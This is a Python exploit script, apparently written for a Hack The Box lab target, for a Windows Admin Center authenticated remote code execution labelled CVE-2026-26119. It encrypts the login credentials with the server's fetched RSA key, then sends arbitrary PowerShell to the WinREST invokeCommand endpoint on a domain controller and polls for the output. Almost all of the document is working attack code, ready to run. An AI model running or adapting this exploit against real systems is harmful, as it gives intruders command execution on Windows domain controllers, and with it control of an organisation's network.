#!/usr/bin/env python3
"""
r3vpwnx

WAC RCE - CVE-2026-26119
Windows Admin Center authenticated RCE via WinREST/PowerShell invokeCommand.

Usage:
    python3 wac_rce.py <user> <pass> "<powershell command>"
    WAC_PASS=<pass> python3 wac_rce.py <user>

Env:
    WAC_BASE  - override target base URL (default below)
    WAC_PASS  - password, used if not passed positionally
"""
import base64
import json
import os
import re
import sys
import time

import requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa as rsa_mod

BASE = os.environ.get("WAC_BASE", "https://dc.danglingtree.htb:6600")
USER = sys.argv[1] if len(sys.argv) > 1 else None
PASS = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("WAC_PASS", "")
SCRIPT = sys.argv[3] if len(sys.argv) > 3 else "whoami"

requests.packages.urllib3.disable_warnings()


def b64url_decode(s: str) -> bytes:
    # base64.urlsafe_b64decode needs correct padding - never assume "=="
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def login(user: str, pw: str) -> requests.Session:
    s = requests.Session()
    s.verify = False

    html = s.get(BASE + "/", timeout=15).text
    m = re.search(r'name="csrf"[^>]*value="([^"]+)"', html)
    if not m:
        print("[!] could not find csrf token on login page", file=sys.stderr)
        sys.exit(1)
    csrf = m.group(1)

    r = s.post(BASE + "/api/user/key", json={"csrf": csrf}, timeout=15)
    if r.status_code != 200:
        print(f"[!] failed to fetch JWK: HTTP {r.status_code}: {r.text[:200]}", file=sys.stderr)
        sys.exit(1)
    jwk = r.json()["jwk"]

    n = int.from_bytes(b64url_decode(jwk["n"]), "big")
    e = int.from_bytes(b64url_decode(jwk["e"]), "big")
    pub = rsa_mod.RSAPublicNumbers(e, n).public_key()

    data = json.dumps({"username": user, "password": pw, "csrf": csrf})
    enc = pub.encrypt(
        data.encode(),
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
    )

    r = s.post(
        BASE + "/api/user/login",
        json={"packet": base64.b64encode(enc).decode(), "csrf": csrf},
        timeout=15,
    )
    if r.status_code != 200:
        print(f"[!] login failed: HTTP {r.status_code}: {r.text[:200]}", file=sys.stderr)
        sys.exit(1)

    # WAC issues the XSRF cookie on successful login - if it's missing, auth silently failed
    if not s.cookies.get("XSRF-TOKEN"):
        print("[!] login likely failed: no XSRF-TOKEN cookie set after login", file=sys.stderr)
        sys.exit(1)

    return s


def run(s: requests.Session, script: str, timeout: int = 120, poll_interval: float = 2.0):
    xsrf = s.cookies.get("XSRF-TOKEN")
    body = {
        "properties": {
            "script": script,
            "command": "x",
            "module": "",
            "state": "ready",
            "useInProcRunspace": False,
            "invokeMode": "Polling",
        }
    }

    r = s.post(
        BASE + "/api/services/WinREST/PowerShell/nodes/dc/invokeCommand",
        json=body,
        headers={"x-xsrf-token": xsrf},
        timeout=timeout,
    )
    if r.status_code != 200:
        return None, f"HTTP {r.status_code}: {r.text[:300]}"

    j = r.json()

    # Handle real polling: if not completed immediately, re-check using
    # whatever session/job identifier the initial response returned.
    # Field name varies by WAC build - inspect a raw response once if this
    # branch triggers and adjust the key below (commonly 'id' or 'sessionId').
    deadline = time.time() + timeout
    while not j.get("completed") and time.time() < deadline:
        job_id = j.get("id") or j.get("sessionId")
        if not job_id:
            return None, f"async with no job id to poll: {json.dumps(j)[:300]}"
        time.sleep(poll_interval)
        pr = s.get(
            BASE + f"/api/services/WinREST/PowerShell/nodes/dc/invokeCommand/{job_id}",
            headers={"x-xsrf-token": xsrf},
            timeout=timeout,
        )
        if pr.status_code != 200:
            return None, f"poll HTTP {pr.status_code}: {pr.text[:300]}"
        j = pr.json()

    if not j.get("completed"):
        return None, f"timed out waiting for completion: {json.dumps(j)[:300]}"

    def ser(x):
        return x if isinstance(x, str) else json.dumps(x, ensure_ascii=False)

    out = "\n".join(ser(x) for x in (j.get("results") or []))
    err = "\n".join(ser(x) for x in (j.get("errors") or []))
    return out, err


def main():
    if not USER or not PASS:
        print("usage: python3 wac_rce.py <user> <pass> [\"<powershell command>\"]", file=sys.stderr)
        print("       (or set WAC_PASS env var and omit <pass>)", file=sys.stderr)
        sys.exit(1)

    s = login(USER, PASS)
    out, err = run(s, SCRIPT)

    if out:
        print(out)
    if err:
        print("[stderr]", err, file=sys.stderr)
    if not out and not err:
        print("(no output)")


if __name__ == "__main__":
    main()
